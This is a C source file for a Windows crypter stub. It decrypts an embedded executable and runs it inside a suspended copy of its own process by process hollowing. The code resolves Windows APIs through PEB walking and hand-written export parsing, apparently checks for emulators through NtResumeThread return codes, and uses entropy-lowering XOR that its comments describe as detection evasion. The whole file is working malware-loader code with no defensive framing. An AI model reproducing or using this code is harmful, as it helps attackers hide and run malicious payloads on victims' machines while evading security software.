#include <Windows.h>

DWORD_PTR pGetProcAddress( void* pDLL, char* szAPI );
wchar_t* GetCurrentFilePath();
void* GetKernel32Base();
void* GetNtdllBase();
void RunFile( BYTE* pFile );
void SIMPLE_ENCRYPT( BYTE* pBuffer, DWORD dwLen, BYTE* bKey, DWORD dwKeyLen, bool bSkip );
DWORD Align( DWORD dwVal, DWORD dwAlignment );
BYTE* GetFile( DWORD dwStartAddr, DWORD dwSize, int inc_every, int inc_multi );

int sc_strcmp( const char* _Str1, const char* _Str2 );
void* sc_memcpy( void* _Dst, const void* _Src, size_t _Size );
void* sc_memset( void* _Dst, int Val, size_t _Size );
wchar_t* sc_wcscpy(wchar_t * str1,const wchar_t * str2);

#pragma comment( linker, "/section:.stubd,EWRS" )
#pragma data_seg( push, ".stubd" )

wchar_t* szCurrentFilePath = NULL;

DWORD dwFileSize = 0;
DWORD dwPaddedFileSize = 0;

DWORD dwSplitMulti = 0;
DWORD dwSplitIncrease = 0;

DWORD dwEncryptStartMarker = 0;
char szVirtualAlloc[] = "VirtualAlloc";
char szVirtualFree[] = "VirtualFree";
char szExitProcess[] = "ExitProcess";
char szCreateProcessW[] = "CreateProcessW";
char szGetThreadContext[] = "GetThreadContext";
char szSetThreadContext[] = "SetThreadContext";
char szReadProcessMemory[] = "ReadProcessMemory";
char szWriteProcessMemory[] = "WriteProcessMemory";
char szVirtualAllocEx[] = "VirtualAllocEx";
char szResumeThread[] = "ResumeThread";
char szNtUnmapViewOfSection[] = "NtUnmapViewOfSection";
DWORD dwEncryptEndMarker = 0;

char szGetProcAddress[] = "GetProcAddress";
char szNtResumeThread[] = "NtResumeThread";

BOOL (WINAPI * pCreateProcessW)(
LPCWSTR lpApplicationName,
LPWSTR lpCommandLine,
LPSECURITY_ATTRIBUTES lpProcessAttributes,
LPSECURITY_ATTRIBUTES lpThreadAttributes,
BOOL bInheritHandles,
DWORD dwCreationFlags,
LPVOID lpEnvironment,
LPCWSTR lpCurrentDirectory,
LPSTARTUPINFOW lpStartupInfo,
LPPROCESS_INFORMATION lpProcessInformation ) = NULL;

LPVOID (WINAPI * pVirtualAlloc)( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect ) = NULL;
BOOL (WINAPI * pVirtualFree)( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType ) = NULL;
VOID (WINAPI * pExitProcess)( UINT uExitCode ) = NULL;
BOOL (WINAPI * pGetThreadContext)( HANDLE hThread, LPCONTEXT lpContext ) = NULL;
BOOL (WINAPI * pSetThreadContext)( HANDLE hThread, CONST CONTEXT *lpContext ) = NULL;
BOOL (WINAPI * pReadProcessMemory)( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead ) = NULL;
BOOL (WINAPI * pWriteProcessMemory)( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten ) = NULL;
LPVOID (WINAPI * pVirtualAllocEx)( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect ) = NULL;
DWORD (WINAPI * pResumeThread)( HANDLE hThread ) = NULL;
LONG (NTAPI * pNtUnmapViewOfSection)( HANDLE ProcessHandle, PVOID BaseAddress ) = NULL;
FARPROC (WINAPI * real_GetProcAddress)( HMODULE hModule, LPCSTR lpProcName ) = NULL;
NTSTATUS (NTAPI * pNtResumeThread)( HANDLE ThreadHandle, PULONG SuspendCount ) = NULL;

BYTE bKey[30] = { 0 };

DWORD bFileMarker = 0;

#pragma data_seg( pop )

#pragma comment( linker, "/section:.stubc,EWRS" )
#pragma code_seg( push, ".stubc" )

void stub_start()
{
	void* pKernel32Base = GetKernel32Base();
	void* pNtdllBase = GetNtdllBase();

	*(DWORD_PTR*)&real_GetProcAddress = pGetProcAddress( pKernel32Base, szGetProcAddress );
	*(DWORD_PTR*)&pNtResumeThread = (DWORD_PTR)real_GetProcAddress( (HMODULE)pNtdllBase, szNtResumeThread );

	LONG lNtStatus = pNtResumeThread( 0, 0 );
	if ( lNtStatus != 0xC0000008 )
		return;

	lNtStatus = pNtResumeThread( (HANDLE)-1, (PULONG)-1 );
	if ( lNtStatus != 0xC0000005 )
		return;

	SIMPLE_ENCRYPT( (BYTE*)&dwEncryptStartMarker, ( (DWORD)&dwEncryptEndMarker - (DWORD)&dwEncryptStartMarker ), bKey, sizeof( bKey ), false );

	*(DWORD_PTR*)&pVirtualAlloc = pGetProcAddress( pKernel32Base, szVirtualAlloc );
	*(DWORD_PTR*)&pVirtualFree = pGetProcAddress( pKernel32Base, szVirtualFree );
	*(DWORD_PTR*)&pExitProcess = pGetProcAddress( pKernel32Base, szExitProcess );
	*(DWORD_PTR*)&pCreateProcessW = pGetProcAddress( pKernel32Base, szCreateProcessW );
	*(DWORD_PTR*)&pGetThreadContext = pGetProcAddress( pKernel32Base, szGetThreadContext );
	*(DWORD_PTR*)&pSetThreadContext = pGetProcAddress( pKernel32Base, szSetThreadContext );
	*(DWORD_PTR*)&pReadProcessMemory = pGetProcAddress( pKernel32Base, szReadProcessMemory );
	*(DWORD_PTR*)&pWriteProcessMemory = pGetProcAddress( pKernel32Base, szWriteProcessMemory );
	*(DWORD_PTR*)&pVirtualAllocEx = pGetProcAddress( pKernel32Base, szVirtualAllocEx );
	*(DWORD_PTR*)&pResumeThread = pGetProcAddress( pKernel32Base, szResumeThread );
	
	*(DWORD_PTR*)&pNtUnmapViewOfSection = (DWORD_PTR)real_GetProcAddress( (HMODULE)pNtdllBase, szNtUnmapViewOfSection );

	
	DWORD dwFileStart = (DWORD)( &bFileMarker ) + sizeof( DWORD );
	BYTE* pFile = GetFile( dwFileStart, dwFileSize, dwSplitIncrease, dwSplitMulti );
	SIMPLE_ENCRYPT( pFile, dwFileSize, bKey, sizeof( bKey ), true );

	szCurrentFilePath = (wchar_t*)pVirtualAlloc( NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	wchar_t* szTempPath = GetCurrentFilePath();
	sc_wcscpy( szCurrentFilePath, szTempPath );

	RunFile( pFile );

	pVirtualFree( szCurrentFilePath, 0, MEM_RELEASE );
	pVirtualFree( pFile, 0, MEM_RELEASE );
	pExitProcess( 0 );
}

void RunFile( BYTE* pFile )
{
	IMAGE_DOS_HEADER* pIDH = (IMAGE_DOS_HEADER*)pFile;
	if ( pIDH->e_magic != IMAGE_DOS_SIGNATURE )
		return;

	IMAGE_NT_HEADERS* pINH = (IMAGE_NT_HEADERS*)( pFile + pIDH->e_lfanew );
	if ( pINH->Signature != IMAGE_NT_SIGNATURE )
		return;

	IMAGE_SECTION_HEADER* pISH = IMAGE_FIRST_SECTION( pINH );

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	sc_memset( &si, 0, sizeof( STARTUPINFO ) );
	sc_memset( &pi, 0, sizeof( PROCESS_INFORMATION ) );
	
	if ( !pCreateProcessW( szCurrentFilePath, 0, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi ) )
		return;

	CONTEXT* pContext = (CONTEXT*)pVirtualAlloc( NULL, sizeof( CONTEXT ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	pContext->ContextFlags = CONTEXT_FULL;

	if ( !pGetThreadContext( pi.hThread, pContext ) )
		return;
	
	DWORD dwImageBase = 0;
	if ( !pReadProcessMemory( pi.hProcess, (LPCVOID)( pContext->Ebx + 8 ), &dwImageBase, sizeof( DWORD ), 0 ) )
		return;

	if ( dwImageBase == pINH->OptionalHeader.ImageBase )
		pNtUnmapViewOfSection( pi.hProcess, (PVOID)dwImageBase );

	BYTE* pTarget = (BYTE*)pVirtualAllocEx( pi.hProcess, (LPVOID)dwImageBase, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
	if ( !pTarget )
		return;

	//add more error checking if wanted but it's a bit redundant in stubs since it will just exit instead of crash
	//can remove most error checking in stub if dont care about crashing (instead of exit) in case something goes wrong somewhere
	pWriteProcessMemory( pi.hProcess, pTarget, pFile, pINH->OptionalHeader.SizeOfHeaders, 0 );
	
	for ( int i = 0; i < pINH->FileHeader.NumberOfSections; i++ )
		pWriteProcessMemory( pi.hProcess, (LPVOID)( pTarget + pISH[i].VirtualAddress ), (LPCVOID)( pFile + pISH[i].PointerToRawData ), pISH[i].SizeOfRawData, 0 );

	pWriteProcessMemory( pi.hProcess, (LPVOID)( pContext->Ebx + 8 ), &pINH->OptionalHeader.ImageBase, sizeof( DWORD ), 0 );
	pContext->Eax = (DWORD)( pTarget + pINH->OptionalHeader.AddressOfEntryPoint );
	pSetThreadContext( pi.hThread, pContext );
	pResumeThread( pi.hThread );
}

DWORD_PTR pGetProcAddress( void* pDLL, char* szAPI )
{
	if ( !pDLL )
		return 0;

	IMAGE_DOS_HEADER* pIDH = (IMAGE_DOS_HEADER*)pDLL;
	if ( pIDH->e_magic != IMAGE_DOS_SIGNATURE )
		return 0;

	IMAGE_NT_HEADERS* pINH = (IMAGE_NT_HEADERS*)( (BYTE*)pDLL + pIDH->e_lfanew );
	if ( pINH->Signature != IMAGE_NT_SIGNATURE )
		return 0;

	IMAGE_EXPORT_DIRECTORY* pIED = (IMAGE_EXPORT_DIRECTORY*)( (BYTE*)pDLL + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
	DWORD* dwFunctions = (DWORD*)( (BYTE*)pDLL + pIED->AddressOfFunctions );
	WORD* wNameOrdinals = (WORD*)( (BYTE*)pDLL + pIED->AddressOfNameOrdinals );
	DWORD* dwNames = (DWORD*)( (BYTE*)pDLL + pIED->AddressOfNames );

	for ( unsigned int i = 0; i < pIED->NumberOfNames; i++ )
	{
		if ( !sc_strcmp( (char*)( (BYTE*)pDLL + dwNames[i] ), szAPI ) )
			return (DWORD_PTR)( (BYTE*)pDLL + dwFunctions[wNameOrdinals[i]] );
	}

	return 0;
}

wchar_t* GetCurrentFilePath()
{
	wchar_t* szExeName = NULL;

	__asm
	{
		mov eax, fs:[0x30]
		mov eax, [eax + 0x10]
		mov eax, [eax + 0x3C]
		mov szExeName, eax
	}

	return szExeName;
}

void* GetKernel32Base()
{
	void* kernel32base = NULL;
	
	__asm
	{
		mov eax, fs:[0x30]
		mov eax, [eax + 0xC]
		mov eax, [eax + 0xC]
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x18]
		mov kernel32base, eax
	}
	
	return kernel32base;
}

void* GetNtdllBase()
{
	void* ntdllbase = NULL;
	
	__asm
	{
		mov eax, fs:[0x30]
		mov eax, [eax + 0xC]
		mov eax, [eax + 0xC]
		mov eax, [eax]
		mov eax, [eax + 0x18]
		mov ntdllbase, eax
	}
	
	return ntdllbase;
}

void SIMPLE_ENCRYPT( BYTE* pBuffer, DWORD dwLen, BYTE* bKey, DWORD dwKeyLen, bool bSkip )
{
	int a = 0;
	int b = 0;
	int d = 0;
	int c = 0;

	//skip encrypting once every 3rd byte, this is to reduce entropy, should not affect detections
	int inc_every = 3;

	for ( unsigned int i = 0; i < dwLen; i++ )
	{
		if ( bSkip && i % inc_every )
			continue;

		if ( d == dwKeyLen )
			d = 0;
		else
			d++;

		a = pBuffer[i];
		b = bKey[d];

		for ( c = 0; c < 255; c++ )
			a ^= c;

		pBuffer[i] = a ^ b;
	}
}

DWORD Align( DWORD dwVal, DWORD dwAlignment )
{
    DWORD dwResult = dwVal;

    if ( dwAlignment )
    {
        if ( dwVal % dwAlignment )
            dwResult = ( dwVal + dwAlignment ) - ( dwVal % dwAlignment );
    }

    return dwResult;
}

BYTE* GetFile( DWORD dwStartAddr, DWORD dwSize, int inc_every, int inc_multi )
{
	BYTE* pFile = (BYTE*)pVirtualAlloc( NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

	int temp_inc = 0;

	for ( unsigned int i = 0; i < dwSize; i++ )
	{
		*(BYTE*)( pFile + i ) = *(BYTE*)( dwStartAddr + temp_inc );
		temp_inc++;

		if ( i % inc_every == 0 )
			temp_inc += inc_multi;	
	}

	return pFile;
}

/* generic functions that would normally be in the CRT however we cant use that here */
int sc_strcmp( const char* _Str1, const char* _Str2 )
{
	int ret = 0;

	while (!(ret = *(unsigned char *)_Str1 - *(unsigned char *)_Str2) && *_Str2)
		++_Str1, ++_Str2;

	if (ret < 0)
		ret = -1;
	else if (ret > 0)
		ret = 1 ;

	return ret;
}

void* sc_memcpy( void* _Dst, const void* _Src, size_t _Size )
{
	void* ret = _Dst;

	while (_Size--)
	{
		*(BYTE*)_Dst = *(BYTE*)_Src;
		_Dst = (BYTE*)_Dst + 1;
		_Src = (BYTE*)_Src + 1;
	}

	return ret;
}

//turn off optimizations due to some compiler bug
#pragma optimize( "", off )
void* sc_memset( void* _Dst, int Val, size_t _Size )
{
	BYTE *pb = (BYTE*)_Dst;
	BYTE *pbend = pb + _Size;
	while (pb != pbend)
		*pb++ = Val;
	return _Dst;
}
#pragma optimize( "", on )

wchar_t* sc_wcscpy(wchar_t * str1,const wchar_t * str2)
{
  wchar_t *save = str1;

  for (; (*str1 = *str2); ++str2, ++str1);
  return save;
}

#pragma code_seg( pop )